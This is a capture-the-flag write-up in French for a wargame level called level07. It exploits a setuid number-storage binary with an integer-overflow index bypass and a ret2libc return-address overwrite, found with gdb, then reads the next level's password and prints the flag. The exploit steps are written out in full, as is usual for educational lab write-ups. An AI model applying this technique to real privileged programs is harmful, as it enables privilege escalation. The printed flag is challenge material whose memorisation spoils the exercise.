# level07

```bash
$ ls -l
total 12
-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 level07
$ file level07
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf5b46cdb878d5a3929cc27efbda825294de5661e, not stripped
$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 42
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 42
 Completed read command successfully
Input command: store
 Number: 290
 Index: 3
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

Nous ne pouvons pas utiliser des index multiple de `3` ou `183` après une division par `16777216` et il impossible d’utiliser les variables d’environnement. Nous allons utiliser `RET2LIBC`.

```bash
$ gdb -q ./level07
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048729 in main ()
(gdb) info functions system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system # adresse de system()
0xf7f48a50  svcerr_systemerr
(gdb) info proc map
process 2385
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        **0xf7e2c000** 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 **0xf7fd0000**     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec # adresse de "/bin/sh"
1 pattern found.
```

Nous avons les adresses suivantes:

- system: 0xf7e6aed0 (4159090384)
- “/bin/sh”: 0xf7f897ec (4160264172)

```bash
$ gdb -q ./level07
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
(gdb) b store_number
Breakpoint 1 at 0x8048636
(gdb) r
Starting program: /home/users/level07/level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store

Breakpoint 1, 0x08048636 in store_number ()
(gdb) x $ebp+0x8
0xffffd520:     0xffffd544
(gdb) b *main+718 # return du main
(gdb) c
Continuing.
 Number: 2
 Index: 2
 Completed store command successfully
Input command: quit

Breakpoint 2, 0x080489f1 in main ()
(gdb) x/wx $esp
0xffffd70c:     0xf7e45513
```

Calcul de l’EIP:

0xffffd70c - 0xffffd544 = 456

456 / 4 = 114

114 % 3 = 0

0xffffffff / 4 + 114 + 1 = 1073741938

```bash
$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

FLAG: `7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC`